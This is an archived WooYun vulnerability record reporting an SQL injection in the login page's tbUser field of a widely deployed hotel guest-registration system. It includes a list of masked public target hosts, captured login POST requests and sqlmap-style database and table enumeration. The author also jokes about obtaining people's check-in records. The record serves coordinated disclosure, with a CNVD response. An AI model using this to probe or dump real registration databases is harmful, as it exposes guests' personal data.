{"id": 72853, "wybug_id": "wooyun-2015-0147556", "wybug_title": "开房信息安全之某社会信息采集平台旅馆信息管理系统通用SQL注入漏洞(附大量案例)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-10-19 09:49", "wybug_open_date": "2016-01-21 16:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向公众公开  简要描述： 开房信息安全之某社会信息采集平台之旅馆信息管理系统通用SQL注入漏洞  PS: 你还在为没有开房信息而担忧困扰么 详细说明：  之前发现这个系统存在弱口令导致的海量开房信息泄漏。具体可见http://**.**.**.**/bugs/wooyun-2010-0136212http://**.**.**.**/bugs/wooyun-2010-0136013http://**.**.**.**/bugs/wooyun-2010-0112009等等。意外发现由北京航天金盾科技有限公司研发的社会信息采集平台-旅馆信息管理系统存在通用SQL注入漏洞，涉及大量开放信息，危害较大。系统架构：ASPX+oracle漏洞问题：SQL注入漏洞漏洞文件：/Login.aspx注入参数：tbUser或许别人都没注意这个系统其实用的比较广泛，内外网都有。动手找了下，内网就算了，公网系统列举部分如下：**.**.**.**/hotelbs/default.aspx**.**.**.**/hotelbs/default.aspx**.**.**.**/hotelbs/default.aspx**.**.**.**/hotelbs/default.aspxhttp://**.**.**.**:8888/hotelbs/default.aspx**.**.**.**:8080/hotelbs/Login.aspx**.**.**.**/hotelbs/default.aspx**.**.**.**/hotelbs/default.aspx**.**.**.**/hotelbs164/default.aspx**.**.**.**:9080/hotelbs164/default.aspx**.**.**.**/hotelbs/default.aspx**.**.**.**/hotelbs/default.aspx**.**.**.**/hotelbs/default.aspx**.**.**.**:9080/hotelbs164/default.aspx**.**.**.**/hotelbs/default.aspxhttp://**.**.**.**/default.aspx**.**.**.**/**.**.**.**/**.**.**.**:8090/hotelbs/Login.aspx**.**.**.**:235/dylg/**.**.**.**/http://**.**.**.**:235/dylgy/login.aspx**.**.**.**:9090/Login.aspxhttp://**.**.**.**/default.aspx**.**.**.**:88/default.aspx**.**.**.**/default.aspx等等。测试了都存在注入问题。举例验证下吧：如：**.**.**.**/hotelbs/Login.aspx\n\n\nPOST /hotelbs/Login.aspx HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: **.**.**.**/hotelbs/Login.aspxx-microsoftajax: Delta=trueContent-Type: application/x-www-form-urlencodedCache-Control: no-cacheAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)Host: **.**.**.**Content-Length: 854Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=p44xkz2zh14zes45lvc2qsmbsmMain=upTimer|ibtLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE1NjIxNDg0NjUPZBYCAgMPZBYCAgMPZBYCZg9kFgQCAQ9kFgQCAQ8PZBYCHgpvbktleVByZXNzBR1OZXh0Rm9jdXMoZXZlbnQsJ3RiUGFzc3dvcmQnKWQCBQ8PZBYCHwAFXWlmKGV2ZW50LmtleUNvZGU9PTEzKSB7IHZhciBidG5Mb2dpbj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaWJ0TG9naW4nKTsgYnRuTG9naW4uY2xpY2soKTsgfWQCAw8PFgIeB1Zpc2libGVoFgIeB29uY2xpY2sFLW9wZW5XaW5kb3dFZHooJ3BvbGljZW1hbmlkY2FyZC5hc3B4P3R5cGU9MScpO2QYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFCGlidExvZ2luF2UlMdPt0ZLKOPUi2%2BGLhhQlGLk%3D&__VIEWSTATEGENERATOR=5C4684BD&__EVENTVALIDATION=%2FwEWCwKxv9GtBgLGvdL3AQKr8tnHBgK3jsrkBAKM54rGBgLL%2FYu6AwKt6sazBAKu4tDbCgLDvJbUCgLvz4aZDgLavZ2gCrFNJVVkLTgGWyyYkOBQZZJkWBdn&tbUser=dasd&tbPassword=dasdsa&hdCert=&hdSSL=&hdSerial=&hdUrl=http%3A%2F%2F**.**.**.**%2Fhotelbs%2F&stationID=&scanType=&ibtLogin.x=28&ibtLogin.y=15\n\n\n涉及数据库26个：\navailable databases [26]:[*] \"SYS\"[*] CTXSYS[*] DBSNMP[*] DDYSYS[*] DMSYS[*] ESJSYS[*] EXFSYS[*] FJJSSGYSYS[*] HOTELBS[*] JXYSYS[*] KSYSYS[*] MANSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SPECIALUSEROUT[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] WTJMYSYS[*] XDB[*] YLYSYS[*] YZYSYS\n大量数据存放于SPECIALUSEROUT数据库及HOTELBS中\nDatabase: SPECIALUSEROUT[19 tables]+---------------------+| DATACENTER          || DEFUPDATE           || DIALPHONE           || EXTRACTLOG          || FZXX                || HOTEL               || HOTEL_141           || MESSAGE             || MSGFEEDBACK         || RECEIVELOG          || SENDLOG             || STATIONLIST         || STATIONLIST20150529 || STATIONLIST_LL      || STATIONLIST_NEW     || STATIONLIST_S       || STATIONLIST_SS      || T2                  || T3                  |+---------------------+\n再或者：**.**.**.**:8080/hotelbs/Login.aspx\n\n\nPOST /hotelbs/Login.aspx HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: **.**.**.**:8080/hotelbs/Login.aspxx-microsoftajax: Delta=trueContent-Type: application/x-www-form-urlencodedCache-Control: no-cacheAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0)Host: **.**.**.**:8080Content-Length: 840Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=upqudpeyckpgh3ndankezt3asmMain=upTimer|ibtLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTM3MjI1OTM0NA9kFgICAw9kFgICAw9kFgJmD2QWBAIBD2QWBAIBDw9kFgIeCm9uS2V5UHJlc3MFHU5leHRGb2N1cyhldmVudCwndGJQYXNzd29yZCcpZAIFDw9kFgIfAAVdaWYoZXZlbnQua2V5Q29kZT09MTMpIHsgdmFyIGJ0bkxvZ2luPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpYnRMb2dpbicpOyBidG5Mb2dpbi5jbGljaygpOyB9ZAIDDw8WAh4HVmlzaWJsZWgWAh4Hb25jbGljawUtb3BlbldpbmRvd0VkeigncG9saWNlbWFuaWRjYXJkLmFzcHg%2FdHlwZT0xJyk7ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIaWJ0TG9naW5NivBG5%2Fq0vKzajP8hBaq5VFL%2FoQ%3D%3D&__EVENTVALIDATION=%2FwEWCwK61ri%2BDQLGvdL3AQKr8tnHBgK3jsrkBAKM54rGBgLL%2FYu6AwKt6sazBAKu4tDbCgLDvJbUCgLvz4aZDgLavZ2gCmLVRsrSAJUQLp4Lntals7A%2FzRRb&tbUser=dasdasd&tbPassword=dasdadsads&hdCert=&hdSSL=&hdSerial=&hdUrl=http%3A%2F%2F**.**.**.**%2Fhotelbs%2F&stationID=&scanType=&ibtLogin.x=43&ibtLogin.y=10\n\n\n数据库：\n\n   漏洞证明：  如上所述！   修复方案：  系统很老了 升级过滤下吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-23 16:26 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-20 12:11 |    \t\t至尊宝 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:8        | 向大牛学习，向核心白帽子进发,爱工作，爱...)\t\t \n  6666    \n     2015-10-21 11:24 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:10        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区枫叶正...)\t\t \n  车，。野。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}